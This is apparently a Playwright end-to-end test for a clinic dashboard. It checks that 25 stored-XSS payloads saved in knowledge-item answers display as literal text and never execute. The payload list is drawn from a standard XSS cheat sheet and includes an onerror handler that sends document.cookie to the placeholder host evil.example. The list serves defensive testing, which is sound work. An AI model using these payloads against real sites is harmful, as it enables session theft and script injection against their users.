import { randomUUID } from "node:crypto";
import { expect, test } from "@playwright/test";
import { PrismaClient } from "@prisma/client";
import * as argon2 from "argon2";
import { authenticator } from "otplib";
import { computeHashingEmbedding, toVectorLiteral } from "@voice-receptionist/shared";
import { resetAuthRateLimit } from "./reset-rate-limit";

const prisma = new PrismaClient({
  datasources: { db: { url: process.env["DATABASE_MIGRATOR_URL"]! } },
});

/**
 * A13.8: 25 payloads drawn from the standard stored-XSS cheat sheet
 * (script tags, event-handler attributes, javascript: URIs, SVG/iframe
 * vectors, encoded variants) — not an exhaustive fuzzing corpus, but wide
 * enough to catch any of the common ways a `dangerouslySetInnerHTML` or a
 * raw-HTML templating mistake would let one through. The dashboard.README
 * and A13.9's static scan is what actually rules out the vulnerable
 * pattern; this proves the observable behavior matches — stored, then
 * rendered back as literal inert text, on a real screen in a real browser.
 */
const XSS_PAYLOADS: readonly string[] = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg onload=alert(1)>",
  "<body onload=alert(1)>",
  "<iframe src=javascript:alert(1)></iframe>",
  '<a href="javascript:alert(1)">click</a>',
  '<div onmouseover="alert(1)">hover</div>',
  "<input onfocus=alert(1) autofocus>",
  "<marquee onstart=alert(1)>x</marquee>",
  "<details open ontoggle=alert(1)>x</details>",
  "<video><source onerror=alert(1)></video>",
  "<audio src=x onerror=alert(1)>",
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><button>x</button></form>',
  "<style>@import 'javascript:alert(1)';</style>",
  "'-alert(1)-'",
  '"><script>alert(1)</script>',
  "<ScRiPt>alert(1)</sCrIpT>",
  "<script>alert(String.fromCharCode(88,83,83))</script>",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  '<img src="x" onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">',
  "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  '<table background="javascript:alert(1)"></table>',
];

interface Fixture {
  email: string;
  password: string;
  totpSecret: string;
}

async function seedFixtureWithPayloads(): Promise<Fixture> {
  const suffix = randomUUID().slice(0, 8);
  const tenant = await prisma.tenant.create({
    data: {
      legalName: `E2E XSS Clinic ${suffix}`,
      commercialRegistration: `CR-XSS-${suffix}`,
      status: "active",
      planCode: "test",
    },
  });
  await prisma.location.create({
    data: {
      tenantId: tenant.id,
      name: "Main Branch",
      addressLine: "Test",
      timezone: "Asia/Riyadh",
      active: true,
    },
  });

  for (const [index, payload] of XSS_PAYLOADS.entries()) {
    const id = randomUUID();
    const questionText = `XSS probe question ${index}`;
    const embedding = toVectorLiteral(computeHashingEmbedding(questionText));
    await prisma.$executeRaw`
      INSERT INTO "KnowledgeItem" (id, "tenantId", "questionText", "answerText", language, embedding, active)
      VALUES (
        ${id}::uuid,
        ${tenant.id}::uuid,
        ${questionText},
        ${payload},
        'en'::"KnowledgeLanguage",
        ${embedding}::vector(1536),
        true
      )
    `;
  }

  const password = "XssOwnerPassw0rd!123";
  const passwordHash = await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 19456,
    timeCost: 2,
    parallelism: 1,
  });
  const totpSecret = authenticator.generateSecret();
  const user = await prisma.user.create({
    data: {
      tenantId: tenant.id,
      email: `owner-xss-${suffix}@e2e.example`,
      passwordHash,
      role: "tenant_owner",
      status: "active",
      totpSecret,
      totpEnrolledAt: new Date(),
    },
  });

  return { email: user.email, password, totpSecret };
}

test.describe("Module 13: output encoding against stored XSS (A13.8)", () => {
  let fixture: Fixture;

  test.beforeAll(async () => {
    await resetAuthRateLimit("127.0.0.1");
    fixture = await seedFixtureWithPayloads();
  });

  test.afterAll(async () => {
    await prisma.$disconnect();
  });

  test("25 stored XSS payloads in a knowledge item's answer render as inert literal text, never execute, and are never stripped", async ({
    page,
  }) => {
    const dialogs: string[] = [];
    page.on("dialog", (dialog) => {
      dialogs.push(dialog.message());
      void dialog.dismiss();
    });

    await page.goto("/en/sign-in");
    await page.getByLabel("Email").fill(fixture.email);
    await page.getByLabel("Password").fill(fixture.password);
    await page.getByRole("button", { name: "Sign in" }).click();
    await expect(page).toHaveURL(/\/en\/verify\?/);
    await page.getByLabel("Verification code").fill(authenticator.generate(fixture.totpSecret));
    await page.getByRole("button", { name: "Verify" }).click();
    await expect(page).toHaveURL(/\/en$/);

    await page.goto("/en/knowledge");
    await page.getByText("XSS probe question 0").waitFor();

    const bodyText = await page.locator("body").innerText();
    for (const payload of XSS_PAYLOADS) {
      expect(bodyText, `payload not found as literal text: ${payload}`).toContain(payload);
    }

    // The strongest proof: nothing executed. A real <script>/onerror/onload
    // firing would have opened a dialog, which the listener above would
    // have recorded.
    expect(dialogs).toEqual([]);
  });
});
